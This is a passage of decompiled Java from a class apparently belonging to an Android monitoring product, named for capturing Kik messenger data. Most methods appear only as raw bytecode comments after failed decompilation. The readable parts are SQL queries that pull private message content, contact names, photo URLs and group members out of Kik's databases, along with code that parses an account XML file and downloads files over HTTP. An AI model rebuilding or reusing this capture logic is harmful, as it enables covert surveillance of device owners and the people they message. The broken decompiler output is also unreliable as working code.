    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: iconst_4
    //   5: istore_3
    //   6: iload_3
    //   7: anewarray 88	java/lang/String
    //   10: astore 4
    //   12: iconst_0
    //   13: istore 5
    //   15: aconst_null
    //   16: astore 6
    //   18: invokestatic 856	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   21: astore 7
    //   23: new 206	java/io/File
    //   26: astore 8
    //   28: aload 8
    //   30: aload_0
    //   31: invokespecial 224	java/io/File:<init>	(Ljava/lang/String;)V
    //   34: aload 8
    //   36: invokevirtual 859	java/io/File:exists	()Z
    //   39: istore_3
    //   40: iload_3
    //   41: ifeq +471 -> 512
    //   44: new 861	java/io/FileInputStream
    //   47: astore 9
    //   49: aload 9
    //   51: aload 8
    //   53: invokespecial 862	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   56: aload 7
    //   58: invokevirtual 866	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   61: astore 6
    //   63: new 868	org/xml/sax/InputSource
    //   66: astore 7
    //   68: aload 7
    //   70: aload 9
    //   72: invokespecial 871	org/xml/sax/InputSource:<init>	(Ljava/io/InputStream;)V
    //   75: aload 6
    //   77: aload 7
    //   79: invokevirtual 877	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
    //   82: astore 6
    //   84: aload 6
    //   86: invokeinterface 883 1 0
    //   91: astore 7
    //   93: aload 7
    //   95: invokeinterface 888 1 0
    //   100: ldc_w 890
    //   103: astore 7
    //   105: aload 6
    //   107: aload 7
    //   109: invokeinterface 894 2 0
    //   114: astore 7
    //   116: aload 7
    //   118: invokeinterface 899 1 0
    //   123: istore 10
    //   125: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   128: istore 5
    //   130: iload 5
    //   132: ifeq +3 -> 135
    //   135: iconst_0
    //   136: istore 5
    //   138: aconst_null
    //   139: astore 6
    //   141: iload 5
    //   143: iload 10
    //   145: if_icmpge +331 -> 476
    //   148: aload 7
    //   150: iload 5
    //   152: invokeinterface 903 2 0
    //   157: astore_2
    //   158: aload_2
    //   159: invokeinterface 909 1 0
    //   164: astore 11
    //   166: ldc_w 911
    //   169: astore 12
    //   171: aload 11
    //   173: aload 12
    //   175: invokeinterface 917 2 0
    //   180: astore 11
    //   182: aload 11
    //   184: ifnull +107 -> 291
    //   187: aload 11
    //   189: invokeinterface 920 1 0
    //   194: astore 11
    //   196: ldc_w 922
    //   199: astore 12
    //   201: aload 11
    //   203: aload 12
    //   205: invokevirtual 179	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   208: istore 13
    //   210: iload 13
    //   212: ifeq +88 -> 300
    //   215: iconst_0
    //   216: istore 14
    //   218: aconst_null
    //   219: astore 11
    //   221: aload_2
    //   222: invokeinterface 926 1 0
    //   227: astore_2
    //   228: aload_2
    //   229: invokeinterface 920 1 0
    //   234: astore_2
    //   235: aload 4
    //   237: iconst_0
    //   238: aload_2
    //   239: aastore
    //   240: iconst_0
    //   241: istore_1
    //   242: aconst_null
    //   243: astore_2
    //   244: iconst_0
    //   245: istore 14
    //   247: aconst_null
    //   248: astore 11
    //   250: aload 4
    //   252: iconst_0
    //   253: aaload
    //   254: astore 11
    //   256: ldc_w 928
    //   259: astore 12
    //   261: ldc_w 518
    //   264: astore 15
    //   266: aload 11
    //   268: aload 12
    //   270: aload 15
    //   272: invokevirtual 932	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   275: astore 11
    //   277: aload 4
    //   279: iconst_0
    //   280: aload 11
    //   282: aastore
    //   283: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   286: istore_1
    //   287: iload_1
    //   288: ifeq +3 -> 291
    //   291: iload 5
    //   293: iconst_1
    //   294: iadd
    //   295: istore 5
    //   297: goto -156 -> 141
    //   300: ldc_w 934
    //   303: astore 12
    //   305: aload 11
    //   307: aload 12
    //   309: invokevirtual 179	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   312: istore 13
    //   314: iload 13
    //   316: ifeq +37 -> 353
    //   319: iconst_2
    //   320: istore 14
    //   322: aload_2
    //   323: invokeinterface 926 1 0
    //   328: astore_2
    //   329: aload_2
    //   330: invokeinterface 920 1 0
    //   335: astore_2
    //   336: aload 4
    //   338: iload 14
    //   340: aload_2
    //   341: aastore
    //   342: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   345: istore_1
    //   346: iload_1
    //   347: ifeq -56 -> 291
    //   350: goto -59 -> 291
    //   353: ldc_w 936
    //   356: astore 12
    //   358: aload 11
    //   360: aload 12
    //   362: invokevirtual 179	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   365: istore 13
    //   367: iload 13
    //   369: ifeq +37 -> 406
    //   372: iconst_1
    //   373: istore 14
    //   375: aload_2
    //   376: invokeinterface 926 1 0
    //   381: astore_2
    //   382: aload_2
    //   383: invokeinterface 920 1 0
    //   388: astore_2
    //   389: aload 4
    //   391: iload 14
    //   393: aload_2
    //   394: aastore
    //   395: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   398: istore_1
    //   399: iload_1
    //   400: ifeq -109 -> 291
    //   403: goto -112 -> 291
    //   406: ldc_w 938
    //   409: astore 12
    //   411: aload 11
    //   413: aload 12
    //   415: invokevirtual 179	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   418: istore 14
    //   420: iload 14
    //   422: ifeq -131 -> 291
    //   425: iconst_3
    //   426: istore 14
    //   428: aload_2
    //   429: invokeinterface 926 1 0
    //   434: astore_2
    //   435: aload_2
    //   436: invokeinterface 920 1 0
    //   441: astore_2
    //   442: aload 4
    //   444: iload 14
    //   446: aload_2
    //   447: aastore
    //   448: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   451: istore_1
    //   452: iload_1
    //   453: ifeq -162 -> 291
    //   456: goto -165 -> 291
    //   459: astore 9
    //   461: iconst_0
    //   462: istore_3
    //   463: aconst_null
    //   464: astore 9
    //   466: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   469: istore 5
    //   471: iload 5
    //   473: ifeq +3 -> 476
    //   476: aload 9
    //   478: invokestatic 940	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   481: aload 4
    //   483: areturn
    //   484: astore 9
    //   486: aload 6
    //   488: invokestatic 940	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   491: aload 9
    //   493: athrow
    //   494: astore 16
    //   496: aload 9
    //   498: astore 6
    //   500: aload 16
    //   502: astore 9
    //   504: goto -18 -> 486
    //   507: astore 6
    //   509: goto -43 -> 466
    //   512: iconst_0
    //   513: istore_3
    //   514: aconst_null
    //   515: astore 9
    //   517: goto -41 -> 476
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	520	0	paramString	String
    //   1	452	1	bool1	boolean
    //   3	444	2	localObject1	Object
    //   5	2	3	i	int
    //   39	475	3	bool2	boolean
    //   10	472	4	arrayOfString	String[]
    //   13	282	5	j	int
    //   295	1	5	k	int
    //   469	3	5	bool3	boolean
    //   16	483	6	localObject2	Object
    //   507	1	6	localException1	Exception
    //   21	128	7	localObject3	Object
    //   26	26	8	localFile	File
    //   47	24	9	localFileInputStream	java.io.FileInputStream
    //   459	1	9	localException2	Exception
    //   464	13	9	localInputStream	java.io.InputStream
    //   484	13	9	localObject4	Object
    //   502	14	9	localObject5	Object
    //   123	23	10	m	int
    //   164	248	11	localObject6	Object
    //   169	245	12	str1	String
    //   208	160	13	bool4	boolean
    //   216	176	14	n	int
    //   418	3	14	bool5	boolean
    //   426	19	14	i1	int
    //   264	7	15	str2	String
    //   494	7	16	localObject7	Object
    // Exception table:
    //   from	to	target	type
    //   23	26	459	java/lang/Exception
    //   30	34	459	java/lang/Exception
    //   34	39	459	java/lang/Exception
    //   44	47	459	java/lang/Exception
    //   51	56	459	java/lang/Exception
    //   23	26	484	finally
    //   30	34	484	finally
    //   34	39	484	finally
    //   44	47	484	finally
    //   51	56	484	finally
    //   56	61	494	finally
    //   63	66	494	finally
    //   70	75	494	finally
    //   77	82	494	finally
    //   84	91	494	finally
    //   93	100	494	finally
    //   107	114	494	finally
    //   116	123	494	finally
    //   125	128	494	finally
    //   150	157	494	finally
    //   158	164	494	finally
    //   173	180	494	finally
    //   187	194	494	finally
    //   203	208	494	finally
    //   221	227	494	finally
    //   228	234	494	finally
    //   238	240	494	finally
    //   252	254	494	finally
    //   270	275	494	finally
    //   280	283	494	finally
    //   283	286	494	finally
    //   307	312	494	finally
    //   322	328	494	finally
    //   329	335	494	finally
    //   340	342	494	finally
    //   342	345	494	finally
    //   360	365	494	finally
    //   375	381	494	finally
    //   382	388	494	finally
    //   393	395	494	finally
    //   395	398	494	finally
    //   413	418	494	finally
    //   428	434	494	finally
    //   435	441	494	finally
    //   446	448	494	finally
    //   448	451	494	finally
    //   466	469	494	finally
    //   56	61	507	java/lang/Exception
    //   63	66	507	java/lang/Exception
    //   70	75	507	java/lang/Exception
    //   77	82	507	java/lang/Exception
    //   84	91	507	java/lang/Exception
    //   93	100	507	java/lang/Exception
    //   107	114	507	java/lang/Exception
    //   116	123	507	java/lang/Exception
    //   125	128	507	java/lang/Exception
    //   150	157	507	java/lang/Exception
    //   158	164	507	java/lang/Exception
    //   173	180	507	java/lang/Exception
    //   187	194	507	java/lang/Exception
    //   203	208	507	java/lang/Exception
    //   221	227	507	java/lang/Exception
    //   228	234	507	java/lang/Exception
    //   238	240	507	java/lang/Exception
    //   252	254	507	java/lang/Exception
    //   270	275	507	java/lang/Exception
    //   280	283	507	java/lang/Exception
    //   283	286	507	java/lang/Exception
    //   307	312	507	java/lang/Exception
    //   322	328	507	java/lang/Exception
    //   329	335	507	java/lang/Exception
    //   340	342	507	java/lang/Exception
    //   342	345	507	java/lang/Exception
    //   360	365	507	java/lang/Exception
    //   375	381	507	java/lang/Exception
    //   382	388	507	java/lang/Exception
    //   393	395	507	java/lang/Exception
    //   395	398	507	java/lang/Exception
    //   413	418	507	java/lang/Exception
    //   428	434	507	java/lang/Exception
    //   435	441	507	java/lang/Exception
    //   446	448	507	java/lang/Exception
    //   448	451	507	java/lang/Exception
  }
  
  private static String e()
  {
    return "SELECT content_string FROM KikContentTable WHERE content_id=? AND content_name=?";
  }
  
  /* Error */
  private static String e(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 944
    //   5: astore_3
    //   6: invokestatic 795	com/vvt/capture/kik/removeFromPath:e	()Ljava/lang/String;
    //   9: astore 4
    //   11: iconst_2
    //   12: istore 5
    //   14: iload 5
    //   16: anewarray 88	java/lang/String
    //   19: astore 6
    //   21: iconst_0
    //   22: istore 7
    //   24: aload 6
    //   26: iconst_0
    //   27: aload_1
    //   28: aastore
    //   29: iconst_1
    //   30: istore 7
    //   32: aload 6
    //   34: iload 7
    //   36: aload_3
    //   37: aastore
    //   38: aload_0
    //   39: aload 4
    //   41: aload 6
    //   43: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   46: astore_3
    //   47: aload_3
    //   48: invokeinterface 95 1 0
    //   53: istore 8
    //   55: iload 8
    //   57: ifeq +26 -> 83
    //   60: ldc 109
    //   62: astore 4
    //   64: aload_3
    //   65: aload 4
    //   67: invokeinterface 66 2 0
    //   72: istore 8
    //   74: aload_3
    //   75: iload 8
    //   77: invokeinterface 112 2 0
    //   82: astore_2
    //   83: aload_3
    //   84: ifnull +9 -> 93
    //   87: aload_3
    //   88: invokeinterface 74 1 0
    //   93: aload_2
    //   94: areturn
    //   95: astore_3
    //   96: aconst_null
    //   97: astore_3
    //   98: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   101: istore 8
    //   103: iload 8
    //   105: ifeq +3 -> 108
    //   108: aload_3
    //   109: ifnull -16 -> 93
    //   112: goto -25 -> 87
    //   115: astore 9
    //   117: aconst_null
    //   118: astore_3
    //   119: aload 9
    //   121: astore_2
    //   122: aload_3
    //   123: ifnull +9 -> 132
    //   126: aload_3
    //   127: invokeinterface 74 1 0
    //   132: aload_2
    //   133: athrow
    //   134: astore_2
    //   135: goto -13 -> 122
    //   138: astore 4
    //   140: goto -42 -> 98
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	143	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	143	1	paramString	String
    //   1	132	2	localObject1	Object
    //   134	1	2	localObject2	Object
    //   5	83	3	localObject3	Object
    //   95	1	3	localException1	Exception
    //   97	30	3	localObject4	Object
    //   9	57	4	str	String
    //   138	1	4	localException2	Exception
    //   12	3	5	i	int
    //   19	23	6	arrayOfString	String[]
    //   22	13	7	j	int
    //   53	3	8	bool1	boolean
    //   72	4	8	k	int
    //   101	3	8	bool2	boolean
    //   115	5	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   6	9	95	java/lang/Exception
    //   14	19	95	java/lang/Exception
    //   27	29	95	java/lang/Exception
    //   36	38	95	java/lang/Exception
    //   41	46	95	java/lang/Exception
    //   6	9	115	finally
    //   14	19	115	finally
    //   27	29	115	finally
    //   36	38	115	finally
    //   41	46	115	finally
    //   47	53	134	finally
    //   65	72	134	finally
    //   75	82	134	finally
    //   98	101	134	finally
    //   47	53	138	java/lang/Exception
    //   65	72	138	java/lang/Exception
    //   75	82	138	java/lang/Exception
  }
  
  /* Error */
  private static byte[] e(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +3 -> 10
    //   10: iconst_0
    //   11: newarray <illegal type>
    //   13: astore_3
    //   14: new 946	org/apache/http/impl/client/DefaultHttpClient
    //   17: astore 4
    //   19: aload 4
    //   21: invokespecial 947	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   24: new 949	org/apache/http/client/methods/HttpGet
    //   27: astore 5
    //   29: aload 5
    //   31: aload_0
    //   32: invokespecial 950	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   35: aconst_null
    //   36: astore_1
    //   37: new 952	java/io/ByteArrayOutputStream
    //   40: astore 6
    //   42: aload 6
    //   44: invokespecial 953	java/io/ByteArrayOutputStream:<init>	()V
    //   47: aload 4
    //   49: aload 5
    //   51: invokevirtual 957	org/apache/http/impl/client/DefaultHttpClient:execute	(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    //   54: astore 4
    //   56: aload 4
    //   58: invokeinterface 963 1 0
    //   63: astore 4
    //   65: aload 4
    //   67: invokeinterface 969 1 0
    //   72: astore_1
    //   73: sipush 2048
    //   76: istore 7
    //   78: iload 7
    //   80: newarray <illegal type>
    //   82: astore 4
    //   84: aload_1
    //   85: aload 4
    //   87: invokevirtual 976	java/io/InputStream:read	([B)I
    //   90: istore 8
    //   92: iconst_m1
    //   93: istore 9
    //   95: iload 8
    //   97: iload 9
    //   99: if_icmpeq +42 -> 141
    //   102: iconst_0
    //   103: istore 9
    //   105: aload 6
    //   107: aload 4
    //   109: iconst_0
    //   110: iload 8
    //   112: invokevirtual 980	java/io/ByteArrayOutputStream:write	([BII)V
    //   115: goto -31 -> 84
    //   118: astore 4
    //   120: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   123: istore 7
    //   125: iload 7
    //   127: ifeq +3 -> 130
    //   130: aload_1
    //   131: invokestatic 940	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   134: aload 6
    //   136: invokestatic 983	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   139: aload_3
    //   140: areturn
    //   141: aload 6
    //   143: invokevirtual 986	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   146: astore_3
    //   147: aload_1
    //   148: invokestatic 940	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   151: goto -17 -> 134
    //   154: astore_3
    //   155: aload_1
    //   156: invokestatic 940	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   159: aload 6
    //   161: invokestatic 983	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   164: aload_3
    //   165: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	166	0	paramString	String
    //   1	155	1	localInputStream	java.io.InputStream
    //   5	2	2	bool1	boolean
    //   13	134	3	arrayOfByte	byte[]
    //   154	11	3	localObject1	Object
    //   17	91	4	localObject2	Object
    //   118	1	4	localException	Exception
    //   27	23	5	localHttpGet	org.apache.http.client.methods.HttpGet
    //   40	120	6	localByteArrayOutputStream	java.io.ByteArrayOutputStream
    //   76	3	7	i	int
    //   123	3	7	bool2	boolean
    //   90	21	8	j	int
    //   93	11	9	k	int
    // Exception table:
    //   from	to	target	type
    //   49	54	118	java/lang/Exception
    //   56	63	118	java/lang/Exception
    //   65	72	118	java/lang/Exception
    //   78	82	118	java/lang/Exception
    //   85	90	118	java/lang/Exception
    //   110	115	118	java/lang/Exception
    //   141	146	118	java/lang/Exception
    //   49	54	154	finally
    //   56	63	154	finally
    //   65	72	154	finally
    //   78	82	154	finally
    //   85	90	154	finally
    //   110	115	154	finally
    //   120	123	154	finally
    //   141	146	154	finally
  }
  
  private static String f()
  {
    return "SELECT display_name, photo_url, jid FROM KikContactsTable WHERE jid=?";
  }
  
  /* Error */
  private static String f(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 990
    //   5: astore_3
    //   6: invokestatic 795	com/vvt/capture/kik/removeFromPath:e	()Ljava/lang/String;
    //   9: astore 4
    //   11: iconst_2
    //   12: istore 5
    //   14: iload 5
    //   16: anewarray 88	java/lang/String
    //   19: astore 6
    //   21: iconst_0
    //   22: istore 7
    //   24: aload 6
    //   26: iconst_0
    //   27: aload_1
    //   28: aastore
    //   29: iconst_1
    //   30: istore 7
    //   32: aload 6
    //   34: iload 7
    //   36: aload_3
    //   37: aastore
    //   38: aload_0
    //   39: aload 4
    //   41: aload 6
    //   43: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   46: astore_3
    //   47: aload_3
    //   48: invokeinterface 95 1 0
    //   53: istore 8
    //   55: iload 8
    //   57: ifeq +26 -> 83
    //   60: ldc 109
    //   62: astore 4
    //   64: aload_3
    //   65: aload 4
    //   67: invokeinterface 66 2 0
    //   72: istore 8
    //   74: aload_3
    //   75: iload 8
    //   77: invokeinterface 112 2 0
    //   82: astore_2
    //   83: aload_3
    //   84: ifnull +9 -> 93
    //   87: aload_3
    //   88: invokeinterface 74 1 0
    //   93: aload_2
    //   94: areturn
    //   95: astore_3
    //   96: aconst_null
    //   97: astore_3
    //   98: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   101: istore 8
    //   103: iload 8
    //   105: ifeq +3 -> 108
    //   108: aload_3
    //   109: ifnull -16 -> 93
    //   112: goto -25 -> 87
    //   115: astore 9
    //   117: aconst_null
    //   118: astore_3
    //   119: aload 9
    //   121: astore_2
    //   122: aload_3
    //   123: ifnull +9 -> 132
    //   126: aload_3
    //   127: invokeinterface 74 1 0
    //   132: aload_2
    //   133: athrow
    //   134: astore_2
    //   135: goto -13 -> 122
    //   138: astore 4
    //   140: goto -42 -> 98
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	143	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	143	1	paramString	String
    //   1	132	2	localObject1	Object
    //   134	1	2	localObject2	Object
    //   5	83	3	localObject3	Object
    //   95	1	3	localException1	Exception
    //   97	30	3	localObject4	Object
    //   9	57	4	str	String
    //   138	1	4	localException2	Exception
    //   12	3	5	i	int
    //   19	23	6	arrayOfString	String[]
    //   22	13	7	j	int
    //   53	3	8	bool1	boolean
    //   72	4	8	k	int
    //   101	3	8	bool2	boolean
    //   115	5	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   6	9	95	java/lang/Exception
    //   14	19	95	java/lang/Exception
    //   27	29	95	java/lang/Exception
    //   36	38	95	java/lang/Exception
    //   41	46	95	java/lang/Exception
    //   6	9	115	finally
    //   14	19	115	finally
    //   27	29	115	finally
    //   36	38	115	finally
    //   41	46	115	finally
    //   47	53	134	finally
    //   65	72	134	finally
    //   75	82	134	finally
    //   98	101	134	finally
    //   47	53	138	java/lang/Exception
    //   65	72	138	java/lang/Exception
    //   75	82	138	java/lang/Exception
  }
  
  private static String g()
  {
    return "SELECT member_jid FROM memberTable WHERE group_id =?";
  }
  
  /* Error */
  private static String g(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 994
    //   5: astore_3
    //   6: invokestatic 795	com/vvt/capture/kik/removeFromPath:e	()Ljava/lang/String;
    //   9: astore 4
    //   11: iconst_2
    //   12: istore 5
    //   14: iload 5
    //   16: anewarray 88	java/lang/String
    //   19: astore 6
    //   21: iconst_0
    //   22: istore 7
    //   24: aload 6
    //   26: iconst_0
    //   27: aload_1
    //   28: aastore
    //   29: iconst_1
    //   30: istore 7
    //   32: aload 6
    //   34: iload 7
    //   36: aload_3
    //   37: aastore
    //   38: aload_0
    //   39: aload 4
    //   41: aload 6
    //   43: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   46: astore_3
    //   47: aload_3
    //   48: invokeinterface 95 1 0
    //   53: istore 8
    //   55: iload 8
    //   57: ifeq +26 -> 83
    //   60: ldc 109
    //   62: astore 4
    //   64: aload_3
    //   65: aload 4
    //   67: invokeinterface 66 2 0
    //   72: istore 8
    //   74: aload_3
    //   75: iload 8
    //   77: invokeinterface 112 2 0
    //   82: astore_2
    //   83: aload_3
    //   84: ifnull +9 -> 93
    //   87: aload_3
    //   88: invokeinterface 74 1 0
    //   93: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   96: istore 9
    //   98: iload 9
    //   100: ifeq +3 -> 103
    //   103: aload_2
    //   104: areturn
    //   105: astore_3
    //   106: iconst_0
    //   107: istore 9
    //   109: aconst_null
    //   110: astore_3
    //   111: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   114: istore 8
    //   116: iload 8
    //   118: ifeq +3 -> 121
    //   121: aload_3
    //   122: ifnull -29 -> 93
    //   125: goto -38 -> 87
    //   128: astore 10
    //   130: iconst_0
    //   131: istore 9
    //   133: aconst_null
    //   134: astore_3
    //   135: aload 10
    //   137: astore_2
    //   138: aload_3
    //   139: ifnull +9 -> 148
    //   142: aload_3
    //   143: invokeinterface 74 1 0
    //   148: aload_2
    //   149: athrow
    //   150: astore_2
    //   151: goto -13 -> 138
    //   154: astore 4
    //   156: goto -45 -> 111
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	159	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	159	1	paramString	String
    //   1	148	2	localObject1	Object
    //   150	1	2	localObject2	Object
    //   5	83	3	localObject3	Object
    //   105	1	3	localException1	Exception
    //   110	33	3	localObject4	Object
    //   9	57	4	str	String
    //   154	1	4	localException2	Exception
    //   12	3	5	i	int
    //   19	23	6	arrayOfString	String[]
    //   22	13	7	j	int
    //   53	3	8	bool1	boolean
    //   72	4	8	k	int
    //   114	3	8	bool2	boolean
    //   96	36	9	bool3	boolean
    //   128	8	10	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   6	9	105	java/lang/Exception
    //   14	19	105	java/lang/Exception
    //   27	29	105	java/lang/Exception
    //   36	38	105	java/lang/Exception
    //   41	46	105	java/lang/Exception
    //   6	9	128	finally
    //   14	19	128	finally
    //   27	29	128	finally
    //   36	38	128	finally
    //   41	46	128	finally
    //   47	53	150	finally
    //   65	72	150	finally
    //   75	82	150	finally
    //   111	114	150	finally
    //   47	53	154	java/lang/Exception
    //   65	72	154	java/lang/Exception
    //   75	82	154	java/lang/Exception
  }
  
  private static String h()
  {
    return "SELECT _id FROM messagesTable ORDER BY _id DESC LIMIT 1";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */